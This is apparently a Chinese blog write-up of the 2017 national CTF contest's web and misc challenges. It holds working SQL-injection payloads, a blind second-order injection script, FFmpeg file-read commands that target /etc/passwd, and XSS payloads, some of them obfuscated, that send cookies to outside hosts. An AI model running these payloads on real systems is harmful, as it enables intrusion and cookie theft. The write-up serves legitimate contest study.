---
title: 第十届信息安全国赛 Web MISC writeup
date: 2017-07-11 02:14:01
tags:
- Blogs
- ctf
- sqli
categories:
- Blogs
---


周末花了一整天的打国赛技能赛的线上赛，去年比赛没能进入线下，当时就是因为感觉选手之间py太严重，今年没想到又遇到了这样的问题，所幸的是，今年运气比较好，做出来的题目比较多，所以py没有太过影响到我们。

下面就奉上web和misc的writeup，就我个人看的话，题目虽然不够新颖，但质量已经算是中上了，所谓的抄袭不知道是不是我见识短浅，就我个人看来都是比较正常的思路，xss可能抄袭了一个sandbox吧，感觉对题目本身没有太大的影响。

<!--more-->

# web #

## php ##
挺有趣的一题，虽然过滤很多，但是php是世界上最好的语言，能做的事情还是有很多

列目录，可以找到flag文件
```
code=$f=[];$d=new DirectoryIterator("glob:///var/www/html/f*");var_dump($d);
```
![image.png-274.5kB][1]

然后show_source可以读文件

```
<?php
$flag="flag{php_mail_ld_preload}";
?>
```

## wanna to see your hat? ##

不太喜欢的一题，通过把语句加在html的前面，让浏览器没办法解析直接看到，无聊的设计。

抓包能看到语句
```
select count(*) from t_info where username = '123' or nickname = '123'
```
简单的试了下 单引号被替换成了反斜杠，想到这样的话可以与 nickname 处的第一个引号闭合，构造一个永真语句就好了
```
name=or(1=1)%23'&submit=check

select count(*) from t_info where username = 'or(1=1)#\' or nickname = 'or(1=1)#\'good job
```

## flag vending machine ##

有一个迷惑的id，但是实际上没有任何卵用，感觉是完全无脑case过去的，所以看看别的点。

注册ddog'，在购买东西的时候显示购买成功，但是没有成功扣款。

那应该是存在二次注入，那我可以通过注册账号，然后购买东西，看钱是否减少，来判断条件的真假，这样可以构造出一个二次盲注。

其中还有一点儿过滤，可以通过复写绕过，可以直接通过注册来看名字判断这个问题，加在脚本里。

```
# coding=utf-8

import requests
import random
import hashlib
import time
from random import Random

s = requests.Session()
# url = 'http://106.75.107.53:8888/'
# url = 'http://120.132.55.92:8888/'
url = 'http://120.132.20.183:8888/'
tables_count_num = 0


def get_tables(url):
	
	for i in xrange(50):
		payload = "ddog123' or ((SELECT COUNT(*) from information_schema.tables WHERE table_schema = DATABASE())="+str(i)+")#"

		if get_data(payload):
			print "[*] tables_number: "+str(i)
			tables_number = i
			break

	for j in range(0,tables_number):
		for i in xrange(50):
			payload = "ddog123' or ((SELECT length(table_name) from information_schema.tables WHERE table_schema = DATABASE() limit 1 offset "+str(j)+")="+str(i)+")#"

			if get_data(payload):
				print "[*] tables_length: "+str(i)
				tables_length = i
				break

		tables = ""
		
		for i in range(1,tables_length+1):
			for k in range(30,128):
				payload = "ddog123' or (SELECT ascii(mid(((SELECT table_name from information_schema.tables WHERE table_schema = DATABASE() limit 1 offset "+str(j)+"))from("+str(i)+")))="+str(k+1)+")#"

				# print payload
				if get_data(payload):
					tables += chr(k+1)
					print "[*] tables: "+tables
					break

		print "[*] tables: " + tables


def get_colums(url):

	for i in xrange(50):
		payload = "ddog1223' or ((SELECT COUNT(*) from information_schema.columns WHERE table_name = 'fff1ag')="+str(i)+")#"

		if get_data(payload):
			print "[*] column_number: "+str(i)
			column_number = i
			break

	# tables_number=3

	for j in range(0,column_number):
		for i in xrange(50):
			payload = "ddog1223' or ((SELECT length(column_name) from information_schema.columns WHERE table_name = 'fff1ag' limit 1 offset "+str(j)+")="+str(i)+")#"

			if get_data(payload):
				print "[*] column_length: "+str(i)
				column_length = i
				break

		column = ""
		
		for i in range(1,column_length+1):
			for k in range(30,128):
				payload = "ddog1223' or (SELECT ascii(mid(((SELECT column_name from information_schema.columns WHERE table_name = 'fff1ag' limit 1 offset "+str(j)+"))from("+str(i)+")))="+str(k+1)+")#"

				if get_data(payload):
					column += chr(k+1)
					print "[*] column: "+column
					break

		print "[*] column: " + column


def get_flag(url):

	for i in xrange(50):
			payload = "ddog12s3' or ((SELECT length(thisi5f14g) from fff1ag limit 1)="+str(i)+")#"

			if get_data(payload):
				print "[*] content_length: "+str(i)
				content_length = i
				break

	content = ""
	
	for i in range(1,content_length+1):
		for k in range(30,128):
			payload = "ddog123s' or (SELECT ascii(mid(((SELECT thisi5f14g from fff1ag limit 1))from("+str(i)+")))="+str(k+1)+")#"

			# print payload
			if get_data(payload):
				content += chr(k+1)
				print "[*] content: "+content
				break

	print "[*] content: " + content


def random_str(randomlength=8):
    str = ''
    chars = 'AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789'
    length = len(chars) - 1
    random = Random()
    for i in range(randomlength):
        str+=chars[random.randint(0, length)]
    return str


def get_data(payload):
	
	payload1 = random_str(4)+payload
	payload2 = payload1.replace("SELECT", "SELSELECTECT").replace("WHERE","WHEWHERERE").replace("on", "oonn")
	register(payload2)

	login(payload1)
	buy()

	return check()


def register(user):
	r_url = url+"register.php"
	data = {"user": user, "pass": "user"}
	r = s.post(r_url,data=data)

def login(user):
	l_url = url+"login.php"
	data = {"user": user, "pass": "user"}
	r = s.post(l_url,data=data)

def buy():
	b_url = url+"buy.php?id=1"
	r = s.get(b_url)
	return r.text

def check():
	c_url = url+"user.php"
	r = s.get(c_url)
	#停1s,压力有点儿大
	# time.sleep(1)
	if "1997667" in r.text:
		return True
	else:
		return False

get_flag(url)

服务器特别卡，所以有误差，多打了几次拼起来
	
# flagEbbb6b6ui1d_5q1_iz_3z}
# flag{bbb6b6ui1d_5q1_iz_3z}
```

## 方舟计划 ##

本来觉得非常有意思的一题，可能是除了非预期，导致3个队伍直接做出来了，然后主办方偷偷改题了，搞得人很难受，我们先一步一步来。

首先注册的电话号码地方有注入，但是有过滤

语句大概是
insert into users (username,password,phone) values ('123' , '123', 'test')

然后可以显错，所以可以注
```
username=test&phone=1%27and%20extractvalue%281%2C%20concat%280x5c%2C%28%20select%20%2a%20%2f%2a%2150000from%2a%2f%28select%20name%20%2f%2a%2150000from%2a%2f%20note.user%20where%20id%20%3D1%29x%29%29%29%29%23&password=1&repassword=1

用户名
fangzh0u

username=test&phone=1%27and%20extractvalue%281%2C%20concat%280x5c%2C%28%20select%20%2a%20%2f%2a%2150000from%2a%2f%28select%20password%20%2f%2a%2150000from%2a%2f%20note.user%20where%20name%3D%27ddog%27%29x%29%29%29%29%23&password=1&repassword=1

密码同理\L8qyd7Vk/BIUVSeBfGshSQ==
```

注出来的密码是乱码，很难受，所以看看表里还有没有别的东西。

发现一个config表
config里id，secrectkey
取到secrectkey  BjDjgKE8CEk5hA9z9FDH7otvGntinomp
```
key = "BjDjgKE8CEk5hA9z9FDH7otvGntinomp"
a = AES.new(base64.b64decode(key))
a.decrypt(base64.b64decode(c))
'tencent123\x00\x00\x00\x00\x00\x00'
```
这下账号和密码都有了，那么就登陆上去看看，是一个上传avi的地方，过滤比较严格，传上去的视频会转md4,当时第一反应就是那个ffmpeg任意文件读取的漏洞。

翻了一些文章就赛宁这个最完整，seebug也有一篇360的分析，也可以看看。

[http://blog.cyberpeace.cn/FFmpeg/](http://blog.cyberpeace.cn/FFmpeg/)

```
exp：
https://github.com/neex/ffmpeg-avi-m3u-xbin
```

开始读/etc/passwd被过滤了，稍微研究了一下，好像是只过滤了这个，我们甚至还可以读etc/hosts，那么我们通过跨目录来绕过判断。

```
python3 gen_xbin_avi.py file:///etc/init.d/../passwd 3.avi   
```

![image.png-275.5kB][2]
找到了当前用户，猜测这里有flag

开始读这个目录没东西，突然有flag了

![image.png-194.2kB][3]
```
python3 gen_xbin_avi.py file:////home/s0m3b0dy/flag 3.avi    

flag{U8I6y5hRfmn5M0ViR8im6FAn0GmCb8rg}
```

## guestbook ##

题目本身不太难，不过感觉很多人都对这个题有争议，我就多说几句吧。

题目主要有下面几个条件
聊天版，有CSP（允许unsafe-line），然后有一些sandbox，rname可以修改名字。

ps:这里本来想要详细一点儿，结果题关了...不能截图了

1、首先是sandbox
```
<script>
	//sandbox
	delete window.Function;
	delete window.eval;
	delete window.alert;
	delete window.XMLHttpRequest;
	delete window.Proxy;
	delete window.Image;
	delete window.postMessage;
</script>
```
应该是从0ctf那个题目复制过来的，但是我觉得很常见，没啥问题。

2、然后是CSP
```
Content-Security-Policy	
default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; font-src 'self' fonts.gstatic.com
; style-src 'self' 'unsafe-inline'; img-src 'self'
```
基本都是self

先说正解吧，正解思路比较清楚，既然unsafe-inline，那么我们先获取一个后台的请求再说，bypass csp的方式就那么几种，主要是meta和link两个，测试发现直接传入`<link`就会被替换为hacker。

那么我们可以通过unsafe-inline来构造一个link，那么就不会出现`<link`了

我在[http://lorexxar.cn/2016/10/28/csp-then/](http://lorexxar.cn/2016/10/28/csp-then/)中提到这种攻击方式。
```
var n0t = document.createElement("link");
n0t.setAttribute("rel", "prefetch");
n0t.setAttribute("href", "//ssssss.com/?" + document.cookie);
document.head.appendChild(n0t);
```

这里我们能收到请求，但是cookie里却没东西。这里有一个cookie的路径问题，一会儿也会提到，先简单说一下。

![image.png-93.6kB][4]

如果我们在同一个域的子目录下，我们能看到当前目录的cookie，还有根目录的cookie，通过document.cookie也能读到。

但我们却无法在根目录读取到子目录的cookie，同样也没办法跨目录读cookie，不知道的可以自己去尝试一下。

因为发现存在admin目录，所以怀疑cookie是在admin目录下。

这里的思路是通过iframe引入一个admin目录，然后读取admin目录cookie，返回回来。

脚本
```

var iframe = document.createElement("iframe");
iframe.src = "../admin/";
iframe.id = "frame";
document.body.appendChild(iframe);

iframe.onload = function (){
  	var c = document.getElementById('frame').contentWindow.document.cookie;

	var n0t = document.createElement("link");
	n0t.setAttribute("rel", "prefetch");
	n0t.setAttribute("href", "//xxx/?" + c);
	document.head.appendChild(n0t);
}
```

如果测试过这个payload的话，你会发现，出问题了，因为onload被过滤了，而setTimeout函数需要eval，而这个函数进了沙箱...

这里突然发现还有一个功能，改名。

最最关键的问题是，index.php这个页面没有sandbox，也就是上面的payload是成立的，因为我们可以通过解字符来eval执行，这样就能绕过各种判断。

那么我们只要在提交的地方构造一个自动提交的表单，就能自动修改姓名，然后跳到index.php，执行js

payload
```
<form id="re" action="../rename.php" method="POST">
<input name="nname" type="text" value="<script>eval(String.fromCharCode(118, 97, 114, 32, 105, 102, 114, 97, 109, 101, 32, 61, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 114, 101, 97, 116, 101, 69, 108, 101, 109, 101, 110, 116, 40, 34, 105, 102, 114, 97, 109, 101, 34, 41, 59, 10, 105, 102, 114, 97, 109, 101, 46, 115, 114, 99, 32, 61, 32, 34, 46, 47, 97, 100, 109, 105, 110, 47, 34, 59, 10, 105, 102, 114, 97, 109, 101, 46, 105, 100, 32, 61, 32, 34, 102, 114, 97, 109, 101, 34, 59, 10, 100, 111, 99, 117, 109, 101, 110, 116, 46, 98, 111, 100, 121, 46, 97, 112, 112, 101, 110, 100, 67, 104, 105, 108, 100, 40, 105, 102, 114, 97, 109, 101, 41, 59, 10, 10, 105, 102, 114, 97, 109, 101, 46, 111, 110, 108, 111, 97, 100, 32, 61, 32, 102, 117, 110, 99, 116, 105, 111, 110, 32, 40, 41, 123, 10, 32, 32, 9, 118, 97, 114, 32, 99, 32, 61, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 103, 101, 116, 69, 108, 101, 109, 101, 110, 116, 66, 121, 73, 100, 40, 39, 102, 114, 97, 109, 101, 39, 41, 46, 99, 111, 110, 116, 101, 110, 116, 87, 105, 110, 100, 111, 119, 46, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 111, 111, 107, 105, 101, 59, 10, 10, 9, 118, 97, 114, 32, 110, 48, 116, 32, 61, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 114, 101, 97, 116, 101, 69, 108, 101, 109, 101, 110, 116, 40, 34, 108, 105, 110, 107, 34, 41, 59, 10, 9, 110, 48, 116, 46, 115, 101, 116, 65, 116, 116, 114, 105, 98, 117, 116, 101, 40, 34, 114, 101, 108, 34, 44, 32, 34, 112, 114, 101, 102, 101, 116, 99, 104, 34, 41, 59, 10, 9, 110, 48, 116, 46, 115, 101, 116, 65, 116, 116, 114, 105, 98, 117, 116, 101, 40, 34, 104, 114, 101, 102, 34, 44, 32, 34, 47, 47, 48, 120, 98, 46, 112, 119, 47, 63, 34, 32, 43, 32, 99, 41, 59, 10, 9, 100, 111, 99, 117, 109, 101, 110, 116, 46, 104, 101, 97, 100, 46, 97, 112, 112, 101, 110, 100, 67, 104, 105, 108, 100, 40, 110, 48, 116, 41, 59, 10, 125))</script>"/>
<input type="submit" value="提交">
</form>
<script>document.getElementById('re').submit()</script>
```

这样就能拿到flag。

赛后在和别人聊天时候发现这题还有别的解法，bypass sandbox.

当我们发现sandbox中删除了很多我们需要用到的函数，但是又被删除了，我们可以通过iframe，引入一个子页面，然后把子页面的函数读回来，这样就能绕过sandbox，也就不需要那步改名了。（很厉害的想法）

bypass csp
听@math1as说，bot时候的浏览器版本低于57，导致CVE-2017-5033可用，然后就能直接执行js，csp完全没用了，题目关了，没能亲自测试一下。


# MISC #

好像很多人关心misc的wp

## 传感器1 ##

差分曼彻斯特编码，改了去年的题

```
a = 0x3EAAAAA56A69AA55A95995A569AA95565556
b = 0x3EAAAAA56A69AA556A965A5999596AA95656
ba = bin(b)
print ba
ss = ""

for i in xrange(len(ba[2:])/2):
	
	a1 = ba[i*2:i*2+2]
	a2 = ba[i*2+2:i*2+4]
	# print 'a1:'+a1
	# print 'a2:'+a2
	
	if a2 !='10' and a2 !='01':
		continue
	if a1 !='10' and a1 !='01':
		ss+='1'
		continue

	if a1!=a2:
		ss+='1'
	else:
		ss+='0'

	# print ss

print ss
print len(ss)

ret = ''

# if '8893CA58' in ret:
print hex(int(ss,2)).upper()

#0X10024D8893CA584181L
#0X30024D8845ABF34119L
```

## warmup ##

首页找了一张图，在明文攻击，这里有个小问题，最开始使用4.54跑的，跑了很久完全跑不出来，我还以为有啥问题，后来换了4.53，一下子就跑出来了。

这样拿到3张图，开始脑洞，后来突然想到信息隐藏里有个技术是盲水印攻击，有现成的脚本跑一下

[https://github.com/chishaxie/BlindWaterMark](https://github.com/chishaxie/BlindWaterMark)


## BadHacker##

流量分析
乱七八遭的，啥也有...
有几个提示
```
PRIVMSG #hacker :How can i decrpt them?
:Guest27!~hacker@218.29.102.122 PRIVMSG #hacker :	you need to get the flag i hide on this server.
:Guest27!~hacker@218.29.102.122 PRIVMSG #hacker :	I changed some lines of one of a file on this server,If you find which lines ,and sort them you will get the flag!
:Guest27!~hacker@218.29.102.122 PRIVMSG #hacker :emmmmmmm~~~
:Guest27!~hacker@218.29.102.122 PRIVMSG #hacker :	just calc the md5,and add the flag{}
```

有个irc的服务器，没办法直接连上去，先扫扫端口
```
─[lorexxar@icy] - [~/Documents] - [日 7月 09, 14:24]
└─[$] <> nmap -sT -Pn -p1-10000 202.5.20.47 

Starting Nmap 6.47 ( http://nmap.org ) at 2017-07-09 14:24 CST
Nmap scan report for 202.5.20.47
Host is up (0.16s latency).
Not shown: 9974 closed ports
PORT     STATE    SERVICE
22/tcp   open     ssh
135/tcp  filtered msrpc
136/tcp  filtered profile
137/tcp  filtered netbios-ns
138/tcp  filtered netbios-dgm
139/tcp  filtered netbios-ssn
443/tcp  open     https
445/tcp  filtered microsoft-ds
593/tcp  filtered http-rpc-epmap
901/tcp  filtered samba-swat
1068/tcp filtered instl_bootc
2745/tcp filtered unknown
3127/tcp filtered unknown
3128/tcp filtered squid-http
3306/tcp filtered mysql
3333/tcp filtered dec-notes
4444/tcp filtered krb524
5554/tcp filtered sgi-esphttp
5800/tcp filtered vnc-http
5900/tcp filtered vnc
6129/tcp filtered unknown
6176/tcp filtered unknown
6667/tcp filtered irc
8923/tcp open     unknown
8998/tcp filtered unknown
9996/tcp filtered unknown
```

打开8923是个站，404，显示了一个蜜汁域名信息，想到设置hosts打开，是个ichunqiu，没什么发现，那么扫目录

找到了mysql.bak

翻了翻啥都没有，很难受。

无意中发现换行崩了，脑洞一下，可能是换行有问题，研究了一下，发现有\r,\n,\r\n三种换行，如果nodpadd统计\r有7个，脑洞一下把行数连起来md5

get flag



  [1]: http://static.zybuluo.com/LoRexxar/hml88kgi4o6fedxcf2b310a2/image.png
  [2]: http://static.zybuluo.com/LoRexxar/ovwsqpqw3m7woxybr5n1rx0a/image.png
  [3]: http://static.zybuluo.com/LoRexxar/fezpkgin6jwtnpw28y6ep02b/image.png
  [4]: http://static.zybuluo.com/LoRexxar/tr0z404vlz8pe1622z4uxpm5/image.png